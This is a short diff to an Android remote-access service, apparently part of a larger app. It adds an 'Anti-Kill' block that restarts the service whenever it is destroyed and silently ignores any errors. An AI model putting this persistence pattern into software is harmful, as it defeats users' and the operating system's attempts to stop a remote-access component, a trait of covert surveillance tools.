@@ -87,6 +87,18 @@ public class RemoteAccessService extends Service {
         if (socketManager != null) {
             socketManager.disconnect();
         }
+        
+        // Anti-Kill: Restart service if killed
+        try {
+            Intent restartIntent = new Intent(this, RemoteAccessService.class);
+            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
+                startForegroundService(restartIntent);
+            } else {
+                startService(restartIntent);
+            }
+        } catch (Exception e) {
+            // Ignore
+        }
     }
 
     @Override
